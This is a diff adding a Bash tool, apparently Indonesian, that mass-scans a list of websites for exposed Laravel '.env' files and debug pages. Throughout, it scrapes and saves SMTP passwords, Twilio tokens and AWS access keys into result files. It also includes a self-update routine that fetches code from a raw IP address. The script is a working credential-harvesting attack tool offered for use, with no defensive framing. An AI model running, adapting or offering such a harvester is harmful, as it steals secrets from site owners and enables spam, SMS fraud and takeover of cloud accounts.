@@ -1,0 +1,209 @@
+#!/usr/bin/env bash
+#
+#coupdegrace
+
+tgl=$(date +'%A, %d %B %Y')
+B="\033[1m"
+MERAH="\e[1;31m"
+HIJAU="\e[1;32m"
+BIRU="\e[1;34m"
+NOR="\e[0m"
+LM='\e[41m'
+LB='\e[100m'
+LK='\e[43m'
+KUN='\e[45m'
+
+trap ctrl_c INT
+function ctrl_c() {
+    echo ""
+    echo "Ctrl-C by $USER"
+    echo "Bersihkan layar tunggu sebentar."
+    sleep 3
+    clear
+    exit
+}
+
+echo ""
+cat <<COUP
+,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
+| ~ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | [ | ] | <-    |
+|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|
+| ->| | " | , | . | P | Y | F | G | C | R | L | / | = |  \  |
+|-----',--',--',--',--',--',--',--',--',--',--',--',--'-----|
+| Caps | A | O | E | U | I | D | H | T | N | S | - |  Enter |
+|------'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--------|
+|        | ; | Q | J | K | X | B | M | W | V | Z |          |
+|------,-',--'--,'---'---'---'---'---'---'-,-'---',--,------|
+| ctrl |  | alt |                          | alt  |  | ctrl |
+'------'  '-----'--------------------------'------'  '------'
+                Author : CoupDeGrace
+           Big Thanks : d3b~x && Index Php    
+COUP
+echo -e "                $B $KUN usage [bash ./$0] $NOR"
+if [ ! -d cok ];then
+ mkdir cok
+fi
+if [ ! -d result ];then
+ mkdir result
+fi
+if [ ! -d cms ];then
+ mkdir cms
+fi
+ENV(){
+ambilenv=$(curl --silent --max-time 10 --connect-timeout 10 -L "${TARGET}/.env" | tr -d '\0')
+host=$(echo "$ambilenv" | grep -Po 'MAIL_HOST=\K[^ ]+')
+mailport=$(echo "$ambilenv" | grep -Po 'MAIL_PORT=\K[^ ]+')
+mailname=$(echo "$ambilenv" | grep -Po 'MAIL_USERNAME=\K[^ ]+')
+mailpass=$(echo "$ambilenv" | grep -Po 'MAIL_PASSWORD=\K[^ ]+')
+from=$(echo "$ambilenv" | grep -Po 'MAIL_FROM_ADDRESS=\K[^ ]+')
+twilio1=$(echo "$ambilenv" | grep -Po 'TWILIO_SID=\K[^ ]+')
+twilio2=$(echo "$ambilenv" | grep -Po 'TWILIO_TOKEN=\K[^ ]+')
+twilio3=$(echo "$ambilenv" | grep -Po 'TWILIO_FROM=\K[^ ]+')
+        if [[ -z $host || $host =~ "null" || $host =~ "localhost" || $host =~ "mailtrap.io" || $host =~ "smtp.mailtrap.io" ]]; then
+                        echo -e "${LM}[ERROR][$tgl] ${NOR} ${TARGET}"
+                        echo "${TARGET}" >> cms/laravel.txt
+                        MethodAws;
+                        MethodAws2;
+        else
+                        echo -e "${LB}[ENVVV][$tgl] ${NOR} ${TARGET}"
+                        echo "${TARGET}|$host|$mailport|$mailname|$mailpass|$from" >> result/smtprandom.txt
+                        echo "${TARGET}" >> cms/laravel.txt
+        fi
+        if [[ -z $twilio1 || $twilio1 =~ "null" ]]; then
+        echo "" > uknown.txt
+        else
+                echo "${TARGET}|$twilio1|$twilio2|$twilio3" >> result/twilio.txt
+                echo "${TARGET}" >> laravel.txt
+        fi
+}
+
+MethodAws(){      
+USERAWS1=$(echo "$ambilenv" | grep -Po 'AWS_KEY=\K[^ ]+')
+PASSAWS1=$(echo "$ambilenv" | grep -Po 'AWS_SECRET=\K[^ ]+')
+REGIONPAS1=$(echo "$ambilenv" | grep -Po 'AWS_REGION=\K[^ ]+')
+USERAWS2=$(echo "$ambilenv" | grep -Po 'AWS_ACCESS_KEY_ID=\K[^ ]+')
+PASSAWS2=$(echo "$ambilenv" | grep -Po 'AWS_SECRET_ACCESS_KEY=\K[^ ]+')
+REGIONPAS2=$(echo "$ambilenv" | grep -Po 'AWS_DEFAULT_REGION=\K[^ ]+')
+USERAWS3=$(echo "$ambilenv" | grep -Po 'S3_KEY=\K[^ ]+')
+PASSAWS3=$(echo "$ambilenv" | grep -Po 'S3_SECRET=\K[^ ]+')
+REGIONPAS3=$(echo "$ambilenv" | grep -Po 'S3_REGION=\K[^ ]+')
+        if [[ $ambilenv =~ "AWS_KEY=AKIA" ]];then
+                if [[ -z $USERAWS1 || $USERAWS1 =~ "null" ]]; then
+                        echo "${TARGET}" > uknown.txt
+                        else
+                        echo "${TARGET}|$USERAWS1|$PASSAWS1|$REGIONPAS1" >> result/aws.txt
+                fi
+        elif [[ $ambilenv =~ "AWS_ACCESS_KEY_ID=AKIA" ]];then
+                if [[ -z $USERAWS2 || $USERAWS2 =~ "null" ]]; then
+                         echo "${TARGET}" > uknown.txt
+                        else
+
+                        echo "${TARGET}|$USERAWS2|$PASSAWS2|$REGIONPAS2" >> result/aws.txt
+                fi
+        else
+                if [[ -z $USERAWS3 || $USERAWS3 =~ "null" ]]; then
+                        echo "${TARGET}" > uknown.txt
+                        echo "${TARGET}" >> laravel.txt
+                        else
+                        echo "${TARGET}|$USERAWS3|$PASSAWS3|$REGIONPAS3" >> result/aws.txt
+                fi
+        fi
+}
+MethodAws2(){
+env=$(curl -skL --silent --max-time 10 --connect-timeout 10 --request POST "${TARGET}" -o km.txt -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0." -H "Upgrade-Insecure-Requests" -d "h4xor=c0up" -o km.txt)
+TH=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<pre' | grep "<td \|MAIL_HOST" > cok/k.txt)
+TP=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PORT" > cok/kc.txt)
+TU=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_USERNAME" > cok/kd.txt)
+TS=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PASSWORD" > cok/ke.txt)
+FM=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_FROM_ADDRESS" > cok/kf.txt)
+KTH=$(cat cok/k.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTP=$(cat cok/kc.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTU=$(cat cok/kd.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTS=$(cat cok/ke.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+KTF=$(cat cok/kf.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+SES1=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_ACCESS_KEY_ID\|AWS_KEY\|SES_KEY" > cok/ses1.txt)
+SES2=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_SECRET\|SES_SECRET" > cok/ses2.txt)
+SES3=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_REGION\|SES_REGION" > cok/ses3.txt)
+TWILIO=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_SID" > cok/tw.txt)
+TWILIO1=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_TOKEN" > cok/tw1.txt)
+TWILIO2=$(cat km.txt | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_FROM" > cok/tw3.txt)
+TW1=$(cat cok/tw.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+TW2=$(cat cok/tw1.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+TW3=$(cat cok/tw3.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+USER1=$(cat cok/ses1.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+PASS1=$(cat cok/ses2.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+REG1=$(cat cok/ses3.txt | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+ if [[ -z $KTH || $KTH =~ "null" || $KTH =~ "localhost" || $KTH =~ "mailtrap.io" || $KTH =~ "smtp.mailtrap.io" ]]; then
+                echo "${TARGET}" >> cms/laravel.txt
+        else
+                echo -e "${LK}[DEBUG][$tgl] ${NOR} ${TARGET}"
+                echo "${TARGET}|$KTH|$KTP|$KTU|$KTS|$KTF" >> result/smtprandom.txt
+                echo "${TARGET}" >> cms/laravel.txt
+ fi
+        if [[ $USER1 =~ "AWS_KEY=AKIA" ]];then
+                if [[ -z $USER1 || $USER1 =~ "null" ]]; then
+                        echo "${TARGET}" > uknown.txt
+                        else
+                        echo "${TARGET}|$USER1|$PASS1|$REG1" >> result/aws.txt
+                fi
+        elif [[ $USER1 =~ "AWS_ACCESS_KEY_ID=AKIA" ]];then
+                if [[ -z $USER1 || $USER1 =~ "null" ]]; then
+                         echo "${TARGET}" > uknown.txt
+                        else
+                        echo "${TARGET}|$USER1|$PASS1|$REG1" >> result/aws.txt
+                fi
+        else
+                if [[ -z $USER1 || $USER1 =~ "null" ]]; then
+                        echo "${TARGET}" > uknown.txt
+                        echo "${TARGET}" >> laravel.txt
+                        else
+                        echo "${TARGET}|$USER1|$PASS1|$REG1" >> result/aws.txt
+                fi
+        fi
+                if [[ -z $TW1 || $TW1 =~ "null" ]]; then
+                         echo "${TARGET}" > uknown.txt
+                        else
+                        echo "${TARGET}|$TW1|$TW2|$TW3" >> result/twilio.txt
+                fi
+}
+
+ 
+echo ""
+read -r -p "Mau diupdate dulu gak? [y/N] " response
+case "$response" in
+    [yY][eE][sS]|[yY]) 
+CX=`cat $0 | sha256sum`
+CZ=`curl "http://103.146.202.117/cdg.txt" -s | sha256sum`
+	if [[ $CX != $CZ ]]; then
+		echo "Updating script... Please wait."
+		wget -q "https://raw.githubusercontent.com/indo2010re/LARAVELBOT/master/updated.txt";rm scan;mv update.txt scan;chmod +x scan
+		echo -e "Siap dijalankan $MERAH $B $USER $NOR"
+	else
+		echo "Script sudah terbaru"
+	fi
+	exit 1
+        ;;
+    *)
+        echo ""
+        read -p "Weblist: " TARGETX
+        if [[ ! -f $TARGETX ]]; then
+                echo " $TARGETX Tidak Ditemukan"
+                exit 1
+        fi
+        IFS=$'\r\n'
+        n=1
+        t=1
+        for TARGET in $(cat $TARGETX); do
+        f=$(expr $n % $t)
+        if [[ $f == 0 && $n > 0 ]]; then
+                sleep 1
+        fi
+        ENV $TARGET $n &
+        n=$[$n+1]
+done
+wait
+;;
+esac
+
+
+
